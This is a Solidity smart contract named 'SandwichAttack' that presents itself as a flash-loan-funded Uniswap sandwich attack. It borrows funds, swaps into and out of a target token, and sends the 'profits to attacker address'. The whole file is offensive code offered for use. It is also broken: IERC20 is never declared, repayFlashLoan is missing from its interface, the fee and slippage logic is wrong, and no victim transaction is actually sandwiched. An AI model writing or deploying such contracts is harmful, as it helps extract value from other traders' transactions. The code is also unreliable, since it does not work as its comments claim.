// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapRouter {
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

interface IFlashLoan {
    function executeFlashLoan(uint amount, address token) external;
}

contract SandwichAttack {
    IUniswapRouter public uniswapRouter;
    IFlashLoan public flashLoanContract;
    address public targetToken;

    constructor(address _uniswapRouter, address _flashLoanContract, address _targetToken) {
        uniswapRouter = IUniswapRouter(_uniswapRouter);
        flashLoanContract = IFlashLoan(_flashLoanContract);
        targetToken = _targetToken;
    }

    function startSandwichAttack() external payable {
        // Step 1: Borrow funds using flash loan
        uint256 flashLoanAmount = address(this).balance;
        flashLoanContract.executeFlashLoan(flashLoanAmount, targetToken);

        // Step 2: Swap borrowed funds for target token
        uint256 tokenAmount = IERC20(targetToken).balanceOf(address(this));
        address[] memory path = getPathForETHToToken(targetToken);
        uniswapRouter.swapExactETHForTokens{value: address(this).balance}(tokenAmount, path, address(this), block.timestamp + 1800);

        // Step 3: Swap target token for more ETH
        uint256 tokenBalance = IERC20(targetToken).balanceOf(address(this));
        path = getPathForTokenToETH(targetToken);
        uniswapRouter.swapExactTokensForETH(tokenBalance, 0, path, address(this), block.timestamp + 1800);

        // Step 4: Repay flash loan and keep profits
        uint256 loanFee = (flashLoanAmount * 9) / 10000; // 0.09% fee
        IERC20(targetToken).transfer(address(flashLoanContract), loanFee);
        uint256 profit = address(this).balance - loanFee;
        flashLoanContract.repayFlashLoan(flashLoanAmount, targetToken, profit);

        // Send profits to attacker address
        payable(msg.sender).transfer(profit);
    }

    function getPathForETHToToken(address token) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = uniswapRouter.WETH();
        path[1] = token;
        return path;
    }

    function getPathForTokenToETH(address token) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = uniswapRouter.WETH();
        return path;
    }
}
